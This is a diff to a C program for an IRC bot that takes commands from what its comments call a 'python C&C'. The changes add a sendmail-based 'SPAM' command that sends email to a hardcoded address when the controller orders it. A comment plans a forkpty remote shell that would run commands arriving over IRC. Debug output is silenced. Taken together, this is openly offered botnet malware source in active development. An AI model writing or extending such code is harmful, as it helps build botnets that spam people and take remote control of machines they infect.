@@ -3,14 +3,31 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <unistd.h>
+#include <errno.h>
 #include <string.h>
 #include <sys/socket.h>
 #include <netdb.h>
 #include <time.h>
 
-const size_t buffer_size = 2048;
+#define buffer_size 2048
+
 char in_buffer[buffer_size];
 char out_buffer[buffer_size];
+FILE *sh_pipe;
+
+/* DENNIS DENNIS DENNIS DENNIS DENNIS DENNIS DENNIS DENNIS DENNIS DENNIS DENNIS
+ * see stackoverflow/questions/476354/how-do-nix-pseudo-terminals-work-whats-the-master-slave-channel
+ * for information on creating pseudoshells
+ * Basically what you want to do is forkpty yourself a shell process
+ * probably just do it in main because it's lightweight, and then conditionally
+ * depending on which side of the fork you ended up in either go and run the
+ * bot code or run commands off input and write them to output.
+ *
+ * The only thing to consider is that the server will send information about
+ * the shell opening and closing, but you can ignore this information if you go
+ * this route. Another option is to only open a shell when the C&C requests it,
+ * but that requires a bit more attention as to state.
+ */
 
 /* Function: strpref
  * Determines if its first argument is a prefix of its second.
@@ -19,6 +36,21 @@ bool strpref(const char *pre, const char *str) {
     size_t pre_len = strlen(pre);
     size_t str_len = strlen(str);
     return str_len < pre_len ? false : strncmp(pre, str, pre_len) == 0;
+}
+
+/* Function: sendmail
+ * Invokes sendmail. Basic structure courtesy trojanfoe @ stackoverflow.
+ */
+void sendmail(const char *to, const char *from, const char *subject, const char *message) {
+    // open a pipe to sendmail to do our evil spamming bidding
+    FILE *sendmail_pipe = popen("/usr/sbin/sendmail -t", "w");
+    if (sendmail_pipe != NULL) {
+        fprintf(sendmail_pipe, "To: %s\nFrom: %s\nSubject: %s\n\n", to, from, subject);
+        fwrite(message, sizeof(char), strlen(message), sendmail_pipe);
+        const char *terminator = ".\n";
+        fwrite(terminator, sizeof(char), strlen(terminator), sendmail_pipe);
+        pclose(sendmail_pipe);
+    } // fail silently
 }
 
 /* Function: randstr
@@ -31,7 +63,9 @@ char *randstr(size_t len) {
         "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
         "abcdefghijklmnopqrstuvwxyz";
     char *str = malloc(len + 1);
-    for (size_t i = 0; i < len; i++) {
+
+    size_t i = 0;
+    for (; i < len; i++) {
         str[i] = alphanum[rand() % (sizeof(alphanum) - 1)];
     }
     str[len] = '\0';
@@ -43,8 +77,8 @@ char *randstr(size_t len) {
  * randomish numbers here and on the python C&C.
  */
 unsigned long long hash(unsigned long long i) {
-    unsigned long long prime = 32416189063;
-    unsigned long long mult = 569059615;
+    unsigned long long prime = 32416189063ULL;
+    unsigned long long mult = 569059615ULL;
     return (i * mult) % prime;
 }
 
@@ -111,7 +145,7 @@ void handle_command(char *msg, int conn, char *channel) {
     while (isspace(*msg)) msg++;
     rstrip(msg);
 
-    printf("%s\n", msg);
+    //printf("%s\n", msg);
     if (strpref("PING ", msg)) {
         memset(out_buffer, 0, buffer_size);
         sprintf(out_buffer, "PONG %s\r\n", msg);
@@ -120,7 +154,14 @@ void handle_command(char *msg, int conn, char *channel) {
     char *payload;
     if ((payload = strstr(msg, channel))) {
         payload += strlen(channel) + 2;
-        // handle individual commands
+        if (strpref("SPAM", payload)) {
+            const char *email_to = "chstansbury@gmail.com";
+            // need to figure out rest of sendmail config
+            const char *email_from = "spammy@email.com";
+            const char *email_subject = "An interesting offer.";
+            const char *email_msg = "Nothing nefarious here.";
+            sendmail(email_to, email_from, email_subject, email_msg);
+        }
     }
 }
 
@@ -148,25 +189,29 @@ void command_loop(int conn, char *channel) {
  * This is pretty gross and should use a variadic helper
  */
 void greet_irc(int conn, char *nick, char *channel) {
-    memset(in_buffer, 0, buffer_size);
-    sprintf(in_buffer, "NICK %s\r\n", nick);
-    send(conn, in_buffer, strlen(in_buffer), 0);
+    memset(out_buffer, 0, buffer_size);
+    sprintf(out_buffer, "NICK %s\r\n", nick);
+    send(conn, out_buffer, strlen(out_buffer), 0);
 
-    memset(in_buffer, 0, buffer_size);
-    sprintf(in_buffer, "USER %s %s %s :%s\r\n", nick, nick, nick, nick);
-    send(conn, in_buffer, strlen(in_buffer), 0);
+    memset(out_buffer, 0, buffer_size);
+    sprintf(out_buffer, "USER %s %s %s :%s\r\n", nick, nick, nick, nick);
+    send(conn, out_buffer, strlen(out_buffer), 0);
 
-    memset(in_buffer, 0, buffer_size);
-    sprintf(in_buffer, "PRIVMSG R : Login <>\r\n");
-    send(conn, in_buffer, strlen(in_buffer), 0);
+    memset(out_buffer, 0, buffer_size);
+    sprintf(out_buffer, "PRIVMSG R : Login <>\r\n");
+    send(conn, out_buffer, strlen(out_buffer), 0);
 
-    memset(in_buffer, 0, buffer_size);
-    sprintf(in_buffer, "MODE %s + x\r\n", nick);
-    send(conn, in_buffer, strlen(in_buffer), 0);
+    memset(out_buffer, 0, buffer_size);
+    sprintf(out_buffer, "MODE %s + x\r\n", nick);
+    send(conn, out_buffer, strlen(out_buffer), 0);
 
-    memset(in_buffer, 0, buffer_size);
-    sprintf(in_buffer, "JOIN %s\r\n", channel);
-    send(conn, in_buffer, strlen(in_buffer), 0);
+    memset(out_buffer, 0, buffer_size);
+    sprintf(out_buffer, "JOIN %s\r\n", channel);
+    send(conn, out_buffer, strlen(out_buffer), 0);
+
+    memset(out_buffer, 0, buffer_size);
+    sprintf(out_buffer, "PRIVMSG %s :Hi there server.\r\n", channel);
+    send(conn, out_buffer, strlen(out_buffer), 0);
 }
 
 int main (int argc, char **argv) {
@@ -179,7 +224,7 @@ int main (int argc, char **argv) {
     struct hostent *freenode_he = gethostbyname(irc_host);
     if (!freenode_he) {
         // failed resolving freenode
-        printf("Failed resolving host.\n");
+        //printf("Failed resolving host.\n");
         free(irc_nick);
         free(irc_channel);
         return 0;
@@ -188,7 +233,7 @@ int main (int argc, char **argv) {
     int conn;
     if ((conn = socket(PF_INET, SOCK_STREAM, 0)) < 0)  {
         // failed creating socket
-        printf("Failed creating socket.\n");
+        //printf("Failed creating socket.\n");
         free(irc_nick);
         free(irc_channel);
         free(freenode_he);
